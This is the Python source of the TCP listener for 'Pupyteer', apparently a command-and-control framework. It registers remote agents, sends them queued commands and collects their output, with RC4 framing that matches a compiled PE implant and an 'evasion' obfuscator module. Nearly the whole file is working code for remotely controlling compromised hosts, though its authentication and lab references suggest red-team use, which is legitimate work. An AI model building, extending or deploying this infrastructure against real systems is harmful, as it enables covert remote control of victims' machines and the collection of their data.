"""Async TCP listener for Pupyteer agent callbacks.

Provides the core C2 server transport: accepts inbound TCP connections
from Pupyteer agents, performs session registration, dispatches queued
command on check-in, and collects command output.

Protocol: newline-delimited JSON messages over a plain TCP socket.

Transport encryption is OPTIONAL. When the listener is constructed with a
``rc4_key`` (hex string) in its config, every inbound frame is RC4-decrypted
and every outbound frame is RC4-encrypted, matching the compiled PE agent
(``pe_template.c``) which RC4-frames both directions with ``AGENT_RC4KEY``.
With no ``rc4_key`` the wire stays plaintext (default) — the path the Python
agent stub and the test-suite exercise. The C agent is the source of truth
for the framing; see the WIRE FORMAT comment atop ``pe_template.c``.

Message types:
    Agent → Server:
        {"type": "register", "hostname": "...", "os": "...", "arch": "...",
         "username": "...", "agent_version": "...", "agent_id": "...",
         "signature": "<hex ed25519 sig over nonce>"}
        {"type": "checkin", "session_id": "..."}
        {"type": "output", "session_id": "...", "command_id": "...",
         "output": "..."}

    Server → Agent:
        {"type": "challenge", "nonce": "<hex>"}
        {"type": "registered", "session_id": "..."}
        {"type": "commands", "commands": [{"command_id": "...", "command": "..."}]}
        {"type": "ack"}
        {"type": "error", "message": "..."}

Registration is authenticated with a per-agent Ed25519 keypair (see
``pupyteer.server.core.agent_keys``). On ``register`` the listener issues a
nonce via ``challenge``; the agent signs it and the server verifies against
the pubkey registry before creating a session. Unknown or unsigned agents are
dropped — closing the unauthenticated-session hole.
"""
from __future__ import annotations

import asyncio
import json
import logging
import time
import uuid
from typing import Any, Dict, Optional

from pupyteer.server.core.logging import AuditLogger
from pupyteer.server.sessions.manager import SessionInfo

logger = logging.getLogger("pupyteer.transports.listener")


class PendingCommand:
    """Tracks a command waiting for agent delivery / response."""

    __slots__ = ("command_id", "command", "queued_at", "delivered")

    def __init__(self, command_id: str, command: str, queued_at: float):
        self.command_id = command_id
        self.command = command
        self.queued_at = queued_at
        self.delivered = False


class ConnectionState:
    """Mutable state for one connected agent."""

    __slots__ = ("session_id", "writer", "addr", "connected_at", "last_activity",
                 "agent_id", "authenticated")

    def __init__(
        self,
        session_id: str,
        writer: asyncio.StreamWriter,
        addr: str,
    ):
        self.session_id = session_id
        self.writer = writer
        self.addr = addr
        self.connected_at = time.time()
        self.last_activity = time.time()
        # Populated after a successful authenticated registration.
        self.agent_id: Optional[str] = None
        self.authenticated: bool = False


class AgentListener:
    """Async TCP server that catches Pupyteer agent callbacks.

    Lifecycle:
        1. Instantiate with config dict, a SessionManager, and an AuditLogger.
        2. Call ``await listener.start()`` — blocks (via asyncio.start_server)
           until ``stop()`` is called.
        3. On agent connect → handle_client() drives the JSON-line protocol.
        4. Registration creates a ``SessionInfo`` via the session manager.
        5. Check-in returns any queued commands and updates last_checkin.
        6. Output resolves the pending command and acks through the manager.
    """

    def __init__(
        self,
        config: Dict[str, Any],
        session_manager: Any,
        audit_logger: AuditLogger,
        agent_keys: Any = None,
    ):
        self._host: str = config.get("host", "0.0.0.0")
        self._port: int = int(config.get("port", 8443))
        self._session_manager = session_manager
        self._audit = audit_logger
        # AgentKeyRegistry for Ed25519 registration verification. If None,
        # registration falls back to UNSIGNED (legacy) — see _handle_register.
        self._agent_keys = agent_keys
        # When True, reject agents whose registration lacks a valid signature.
        # Driven by security.require_agent_auth (defaults on when a registry
        # is present).
        self._require_agent_auth: bool = bool(
            config.get("require_agent_auth", agent_keys is not None)
        )
        # Optional RC4 transport key (hex string). When set, the listener
        # decrypts inbound messages and encrypts outbound ones with RC4 so it
        # interoperates with the compiled PE agent (pe_template.c), which
        # RC4-frames every message in BOTH directions using AGENT_RC4KEY.
        # When None (default) the wire stays plaintext — this is the path the
        # Python agent stub and the test-suite exercise. The C agent is the
        # source of truth for the framing; see the WIRE FORMAT comment at the
        # top of pupyteer/agent/core/pe_template.c.
        self._rc4_key: Optional[bytes] = None
        rc4_key_cfg = config.get("rc4_key")
        if rc4_key_cfg:
            try:
                self._rc4_key = bytes.fromhex(str(rc4_key_cfg))
            except ValueError:
                logger.warning(
                    "Listener rc4_key is not valid hex; ignoring — "
                    "wire transport will remain plaintext."
                )
            # Per-connection RC4 stream buffer. RC4 output length == plaintext
            # length, so a ciphertext byte may equal '\n' and split a frame across
            # reader.readline() calls. We accumulate raw ciphertext here and
            # decrypt continuously in _rc4_extract(), keyed by connection in the
            # handler (reset on each new connection).
            self._rc4_buf = bytearray()

        self._server: Optional[asyncio.base_events.Server] = None
        self._connections: Dict[str, ConnectionState] = {}  # session_id → state
        self._lock = asyncio.Lock()
        self._stats: Dict[str, int] = {
            "connections": 0,
            "bytes_sent": 0,
            "bytes_received": 0,
            "sessions_created": 0,
            "commands_dispatched": 0,
        }

    # ------------------------------------------------------------------
    #  Lifecycle
    # ------------------------------------------------------------------

    async def start(self) -> None:
        """Bind the TCP server and start accepting connections."""
        self._server = await asyncio.start_server(
            self._handle_client,
            host=self._host,
            port=self._port,
        )
        addrs = ", ".join(str(s.getsockname()) for s in self._server.sockets)
        logger.info("Agent listener listening on %s", addrs)
        self._audit.log_event("listener_started", {
            "host": self._host,
            "port": self._port,
        })

    async def stop(self) -> None:
        """Gracefully close the server and all active connections."""
        # Close every active connection first
        async with self._lock:
            for sid, conn in list(self._connections.items()):
                try:
                    conn.writer.close()
                    await conn.writer.wait_closed()
                except Exception:
                    pass
            self._connections.clear()

        if self._server is not None:
            self._server.close()
            await self._server.wait_closed()
            self._server = None

        logger.info("Agent listener stopped on %s:%d", self._host, self._port)
        self._audit.log_event("listener_stopped", {
            "host": self._host,
            "port": self._port,
            "stats": dict(self._stats),
        })

    # ------------------------------------------------------------------
    #  Per-connection protocol handler
    # ------------------------------------------------------------------

    async def _handle_client(
        self,
        reader: asyncio.StreamReader,
        writer: asyncio.StreamWriter,
    ) -> None:
        """Read newline-delimited JSON and dispatch each message.

        One TCP connection is expected to carry the lifetime of a single
        agent session (register → many checkin/output cycles).  If an
        agent re-connects it will register again and receive a new
        session_id.
        """
        addr = writer.get_extra_info("peername") or ("unknown", 0)
        remote_str = f"{addr[0]}:{addr[1]}"
        session_id: Optional[str] = None

        logger.debug("New agent connection from %s", remote_str)
        self._stats["connections"] += 1
        # Fresh RC4 stream state for this connection.
        self._rc4_buf = bytearray()

        try:
            while True:
                if self._rc4_key is not None:
                    # RC4 mode does NOT use newline framing: RC4 output length
                    # equals plaintext length, so any ciphertext byte can equal
                    # '\n' or '\r'. reader.readline() would split frames on
                    # spurious delimiters and corrupt the ciphertext stream.
                    # Instead read raw chunks, accumulate ciphertext, and
                    # decrypt the whole buffer as one continuous RC4 stream,
                    # pulling out balanced JSON objects as they complete.
                    chunk = await reader.read(4096)
                    if not chunk:
                        # EOF — flush anything decodable then stop.
                        msgs, leftover = self._rc4_extract(self._rc4_buf)
                        for msg in msgs:
                            r = await self._dispatch(msg, remote_str, writer)
                            if r == "":
                                break
                        break
                    self._stats["bytes_received"] += len(chunk)
                    self._rc4_buf.extend(chunk)
                    msgs, leftover = self._rc4_extract(self._rc4_buf)
                    self._rc4_buf = bytearray(leftover)
                    drop = False
                    for msg in msgs:
                        result = await self._dispatch(msg, remote_str, writer)
                        if result:
                            session_id = result
                        if result == "":
                            drop = True
                            break
                    if drop:
                        break
                    continue

                try:
                    line = await reader.readline()
                except (ConnectionError, OSError):
                    break

                if not line:
                    # EOF — agent disconnected
                    break

                self._stats["bytes_received"] += len(line)

                # Plaintext path: strip whitespace / newline
                raw = line.rstrip(b"\r\n")
                line_str = raw.decode("utf-8", errors="replace").strip()
                if not line_str:
                    continue
                try:
                    msg: Dict[str, Any] = json.loads(line_str)
                except json.JSONDecodeError as exc:
                    logger.warning(
                        "Malformed JSON from %s: %s", remote_str, exc
                    )
                    await self._send_json(
                        writer,
                        {"type": "error", "message": "invalid_json"},
                    )
                    continue
                result = await self._dispatch(msg, remote_str, writer)
                if result:
                    session_id = result
                elif result == "":
                    break  # write failed, drop connection

        except asyncio.CancelledError:
            pass
        except Exception as exc:
            logger.exception("Unhandled error in handler for %s: %s", remote_str, exc)
        finally:
            # Clean up connection tracking
            if session_id:
                async with self._lock:
                    self._connections.pop(session_id, None)
                logger.debug("Session %s disconnected from %s", session_id, remote_str)

            try:
                writer.close()
                await writer.wait_closed()
            except Exception:
                pass

    # ------------------------------------------------------------------
    #  Message dispatch
    # ------------------------------------------------------------------

    async def _dispatch(
        self,
        msg: Dict[str, Any],
        remote: str,
        writer: asyncio.StreamWriter,
    ) -> Optional[str]:
        """Process one parsed message, send its reply, return any session_id.

        Shared by both the plaintext and RC4 paths. Returns the session_id
        captured from a successful registration (for connection cleanup), or
        None. Never raises — send/dispatch failures are logged and surfaced to
        the peer as an error frame.
        """
        captured_session: Optional[str] = None
        try:
            response = await self._process_message(msg, remote, writer)
            if (
                msg.get("type") == "register"
                and response
                and response.get("type") == "registered"
            ):
                captured_session = response["session_id"]
        except Exception as exc:
            logger.exception(
                "Error processing %s from %s: %s",
                msg.get("type"), remote, exc,
            )
            await self._send_json(
                writer,
                {"type": "error", "message": "internal_error"},
            )
            return captured_session

        if response is not None:
            sent = await self._send_json(writer, response)
            if sent == -1:
                # Signal caller to drop the connection on write failure.
                return captured_session or ""
        return captured_session

    def _rc4_extract(self, buf: bytearray):
        """Decrypt accumulated RC4 ciphertext into complete JSON messages.

        The compiled PE agent frames each message as
        ``RC4(json + '\\n') + '\\n'`` — i.e. the plaintext's own '\\n' is inside
        the ciphertext, and an additional '\\n' is appended on the wire. Because
        RC4 output length equals plaintext length, ANY ciphertext byte can equal
        '\\n', so we cannot rely on the wire '\\n' as a frame boundary. Instead we
        RC4-decrypt the whole buffer as a continuous stream and pull out every
        balanced JSON object we can, returning (messages, leftover_bytes).

        Returns (list_of_dicts, leftover_bytearray). Leftover is the tail that
        has not yet formed a complete, balanced JSON object.
        """
        from pupyteer.server.evasion.obfuscator import rc4_crypt

        msgs = []
        # Strip trailing framing newlines the agent appends AFTER the ciphertext
        # (pe_template.c sends RC4(json+'\n') then a separate '\n'). These are
        # NOT part of the ciphertext stream. RC4 preserves length, so removing
        # them keeps the ciphertext prefix intact for a clean decrypt.
        ct = bytes(buf).rstrip(b"\n").rstrip(b"\r")
        if not ct:
            return msgs, bytearray()
        try:
            plain = rc4_crypt(ct, self._rc4_key)
        except Exception as exc:
            logger.warning("RC4 stream decrypt failed: %s", exc)
            # Drop the buffer to avoid a poison-pill loop; report once.
            return msgs, bytearray()

        text = plain.decode("utf-8", errors="ignore")
        # Walk the plaintext, extracting balanced top-level JSON objects.
        depth = 0
        start = -1
        in_str = False
        esc = False
        consumed = 0
        for i, ch in enumerate(text):
            if in_str:
                if esc:
                    esc = False
                elif ch == "\\":
                    esc = True
                elif ch == '"':
                    in_str = False
                continue
            if ch == '"':
                in_str = True
            elif ch == "{":
                if depth == 0:
                    start = i
                depth += 1
            elif ch == "}":
                if depth > 0:
                    depth -= 1
                    if depth == 0 and start >= 0:
                        candidate = text[start:i + 1]
                        try:
                            msgs.append(json.loads(candidate))
                            consumed = i + 1
                        except json.JSONDecodeError:
                            pass
                        start = -1
        # Leftover: ciphertext tail whose plaintext hasn't yet formed a complete
        # JSON object. consumed is a CHARACTER index into the decoded text; map
        # it back to a ciphertext BYTE offset by re-encoding the consumed prefix
        # (errors="ignore" keeps lengths consistent for the retained tail).
        # After the closing '}', also consume the frame's trailing newline (the
        # agent's plaintext JSON ends in '\n' inside the RC4). Each beacon frame
        # is an INDEPENDENT RC4 stream (pe_template.c calls rc4_crypt per
        # message), so trailing framing must be dropped, never carried into the
        # next frame's ciphertext — doing so desyncs the keystream.
        if consumed <= 0:
            # Nothing parsed yet — keep everything as leftover.
            return msgs, bytearray(ct)
        # Extend consumed past any trailing whitespace/newline in the plaintext.
        tail = text[consumed:]
        stripped = tail.lstrip()
        consumed += len(tail) - len(stripped)
        consumed_bytes = len(text[:consumed].encode("utf-8", errors="ignore"))
        if consumed_bytes >= len(ct):
            return msgs, bytearray()
        return msgs, bytearray(ct[consumed_bytes:])

    async def _process_message(
        self,
        msg: Dict[str, Any],
        remote: str,
        writer: asyncio.StreamWriter,
    ) -> Optional[Dict[str, Any]]:
        """Route a parsed JSON message to the appropriate handler."""
        msg_type = msg.get("type", "")

        if msg_type == "register":
            return await self._handle_register(msg, remote, writer)
        if msg_type == "checkin":
            return await self._handle_checkin(msg, writer)
        if msg_type == "output":
            return await self._handle_output(msg)

        logger.warning("Unknown message type '%s' from %s", msg_type, remote)
        return {"type": "error", "message": f"unknown_type: {msg_type}"}

    # ------------------------------------------------------------------
    #  Register
    # ------------------------------------------------------------------

    async def _handle_register(
        self,
        msg: Dict[str, Any],
        remote: str,
        writer: asyncio.StreamWriter,
    ) -> Dict[str, Any]:
        """Register an agent — authenticated via Ed25519 challenge/response.

        Flow when an agent-key registry is configured (the default):
          1. Agent sends {"type":"register", "agent_id": "...", ...} WITHOUT a
             signature. We issue a per-connection nonce and reply
             {"type":"challenge","nonce":...}.
          2. Agent re-sends the same register with "nonce" and "signature".
          3. We verify the signature against the pubkey on file for agent_id.
          Only then is a session created.

        Legacy fallback: if no registry is present AND require_agent_auth is
        False, an unsigned register is accepted (old behaviour) so existing
        lab tooling keeps working. Logged loudly so it's never silent.
        """
        agent_id = msg.get("agent_id", "")
        signature = msg.get("signature", "")
        nonce = msg.get("nonce", "")

        # ---- Stage 1: no signature yet -> issue a challenge ----
        if not signature:
            if self._agent_keys is not None:
                if not agent_id:
                    return {"type": "error", "message": "missing_agent_id"}
                nonce_out = self._agent_keys.issue_nonce(agent_id)
                self._audit.log_event(
                    "agent_challenge_issued",
                    {"agent_id": agent_id, "remote": remote},
                )
                return {"type": "challenge", "nonce": nonce_out}
            # No registry configured and auth not required -> legacy accept.
            if self._require_agent_auth:
                return {"type": "error", "message": "auth_required"}
            logger.warning(
                "UNSIGNED agent registration accepted (no key registry): %s from %s",
                agent_id or "<none>", remote,
            )
            return await self._create_session(msg, remote, writer, agent_id or None)

        # ---- Stage 2: signed register -> verify ----
        if self._agent_keys is None:
            return {"type": "error", "message": "auth_unavailable"}
        if not agent_id:
            return {"type": "error", "message": "missing_agent_id"}
        if not self._agent_keys.is_known(agent_id):
            self._audit.log_event(
                "agent_auth_rejected",
                {"agent_id": agent_id, "remote": remote, "reason": "unknown_agent"},
                result="denied",
            )
            logger.warning(
                "Rejected registration for unknown agent %s from %s",
                agent_id, remote,
            )
            return {"type": "error", "message": "unknown_agent"}

        ok = self._agent_keys.verify_registration(agent_id, signature, nonce)
        if not ok:
            self._audit.log_event(
                "agent_auth_rejected",
                {"agent_id": agent_id, "remote": remote, "reason": "bad_signature"},
                result="denied",
            )
            logger.warning(
                "Rejected registration: bad signature for agent %s from %s",
                agent_id, remote,
            )
            return {"type": "error", "message": "bad_signature"}

        return await self._create_session(msg, remote, writer, agent_id)

    async def _create_session(
        self,
        msg: Dict[str, Any],
        remote: str,
        writer: asyncio.StreamWriter,
        agent_id: Optional[str],
    ) -> Dict[str, Any]:
        """Create + register a SessionInfo for an authenticated agent."""
        session_id = str(uuid.uuid4())[:12]

        info = SessionInfo(
            session_id=session_id,
            hostname=msg.get("hostname", "unknown"),
            os=msg.get("os", "unknown"),
            arch=msg.get("arch", "unknown"),
            username=msg.get("username", "unknown"),
            agent_version=msg.get("agent_version", "unknown"),
            remote_address=remote,
        )

        registered_id = await self._session_manager.register(info)

        async with self._lock:
            conn = ConnectionState(
                session_id=registered_id,
                writer=writer,
                addr=remote,
            )
            conn.agent_id = agent_id
            conn.authenticated = True
            self._connections[registered_id] = conn

        self._stats["sessions_created"] += 1

        self._audit.log_event(
            "session_registered",
            {
                "session_id": registered_id,
                "agent_id": agent_id,
                "hostname": info.hostname,
                "os": info.os,
                "arch": info.arch,
                "username": info.username,
                "remote_address": remote,
            },
            session=registered_id,
        )
        logger.info(
            "Agent registered: %s (agent_id=%s, %s@%s) from %s",
            registered_id, agent_id, info.username, info.hostname, remote,
        )

        return {"type": "registered", "session_id": registered_id}

    # ------------------------------------------------------------------
    #  Check-in
    # ------------------------------------------------------------------

    async def _handle_checkin(
        self,
        msg: Dict[str, Any],
        writer: asyncio.StreamWriter,
    ) -> Dict[str, Any]:
        """Return queued commands for the session and bump last_checkin."""
        session_id = msg.get("session_id", "")

        # Reject check-ins on sessions that never authenticated (only possible
        # when running in legacy unsigned mode — still guarded defensively).
        async with self._lock:
            conn = self._connections.get(session_id)
        if conn is not None and not conn.authenticated:
            self._audit.log_event(
                "agent_auth_rejected",
                {"session_id": session_id, "reason": "unauthenticated_checkin"},
                result="denied",
            )
            return {"type": "error", "message": "unauthenticated"}

        # Update heartbeat
        await self._session_manager.update_checkin(session_id)

        # Refresh connection writer (agent may have reconnected)
        async with self._lock:
            conn = self._connections.get(session_id)
            if conn is not None:
                if conn.writer is not writer:
                    conn.writer = writer
                conn.last_activity = time.time()

        # Pull pending commands from session manager
        pending: list = await self._session_manager.get_pending_commands(session_id)

        commands = []
        for cmd in pending:
            commands.append({
                "command_id": cmd["command_id"],
                "command": cmd["command"],
            })
            # Mark as delivered so we don't re-send on next check-in
            # (session manager keeps them until ack)
            cmd["status"] = "delivered"

        if commands:
            self._stats["commands_dispatched"] += len(commands)
            logger.debug(
                "Dispatching %d command(s) to session %s",
                len(commands), session_id,
            )

        return {"type": "commands", "commands": commands}

    # ------------------------------------------------------------------
    #  Output
    # ------------------------------------------------------------------

    async def _handle_output(self, msg: Dict[str, Any]) -> Dict[str, Any]:
        """Resolve a pending command with its output."""
        session_id = msg.get("session_id", "")
        command_id = msg.get("command_id", "")
        output = msg.get("output", "")

        await self._session_manager.ack_command(session_id, command_id, output)

        self._audit.log_event(
            "session_command_ack",
            {
                "session_id": session_id,
                "command_id": command_id,
                "output_length": len(output),
            },
            session=session_id,
        )
        logger.debug(
            "Received output for command %s (session %s, %d chars)",
            command_id, session_id, len(output),
        )

        return {"type": "ack"}

    # ------------------------------------------------------------------
    #  Helpers
    # ------------------------------------------------------------------

    async def _send_json(
        self,
        writer: asyncio.StreamWriter,
        payload: Dict[str, Any],
    ) -> int:
        """Serialize *payload* to JSON, write with trailing newline.

        Returns the number of bytes written, or -1 on failure.
        """
        try:
            data = (json.dumps(payload) + "\n").encode("utf-8")
            if self._rc4_key is not None:
                # PE agent decrypts inbound frames with the same RC4 key. It
                # strips the trailing framing '\n' then RC4-decrypts the
                # remainder, so we encrypt the JSON (with its own '\n' inside
                # the RC4) and append a fresh delimiter '\n' on the wire.
                from pupyteer.server.evasion.obfuscator import rc4_crypt
                data = rc4_crypt(data, self._rc4_key) + b"\n"
            writer.write(data)
            await writer.drain()
            self._stats["bytes_sent"] += len(data)
            return len(data)
        except (ConnectionError, OSError) as exc:
            logger.warning("Failed to send to peer: %s", exc)
            return -1

    # ------------------------------------------------------------------
    #  Stats / introspection
    # ------------------------------------------------------------------

    @property
    def stats(self) -> Dict[str, Any]:
        """Return a snapshot of listener statistics."""
        return {
            **self._stats,
            "active_connections": len(self._connections),
            "host": self._host,
            "port": self._port,
        }

    @property
    def is_running(self) -> bool:
        return self._server is not None

    def get_connection_sessions(self) -> list:
        """Return list of active session IDs."""
        return list(self._connections.keys())
